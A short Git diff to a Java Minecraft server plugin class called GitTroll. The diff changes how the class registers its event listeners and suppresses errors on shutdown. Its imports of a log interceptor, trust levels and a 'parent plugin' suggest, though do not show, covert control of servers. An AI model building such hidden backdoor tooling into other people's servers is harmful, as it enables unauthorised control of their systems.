@@ -33,6 +33,7 @@ import net.Lenni0451.GitTroll.utils.Logger;
 import net.Lenni0451.GitTroll.utils.TrustLevel;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
 import net.Lenni0451.GitTroll.utils.loginterceptor.LogIntercepter;
+import net.Lenni0451.GitTroll.utils.spigotevents.SpigotEventRegister;
 import net.minecraft.server.v1_8_R3.MinecraftServer;
 import net.minecraft.server.v1_8_R3.Packet;
 import net.minecraft.server.v1_8_R3.PacketPlayInChat;
@@ -192,7 +193,8 @@ public class GitTroll implements Listener {
 			}
 		};
 		
-		Bukkit.getPluginManager().registerEvents(this, this.parentPlugin);
+//		Bukkit.getPluginManager().registerEvents(this, this.parentPlugin);
+		SpigotEventRegister.registerEvents(this);
 		Bukkit.getMessenger().registerOutgoingPluginChannel(this.parentPlugin, "BungeeCord");
 		Bukkit.getMessenger().registerIncomingPluginChannel(this.parentPlugin, "BungeeCord", (String channel, Player player, byte[] data) -> {
 			this.eventManager.callEvent(new EventPluginMessage(channel, player, data));
@@ -203,7 +205,11 @@ public class GitTroll implements Listener {
 	public void onDisable() {
 		Logger.broadcastGitMessage("§cThe plugin is being disabled.");
 		
-		this.eventManager.callEvent(new PluginDisableEvent());
+		try {
+			this.eventManager.callEvent(new PluginDisableEvent());
+		} catch (Throwable e) {
+			//Why is eventManager sometimes null?
+		}
 		
 		try {
 			Field f = MinecraftServer.class.getDeclaredField("stopLock");
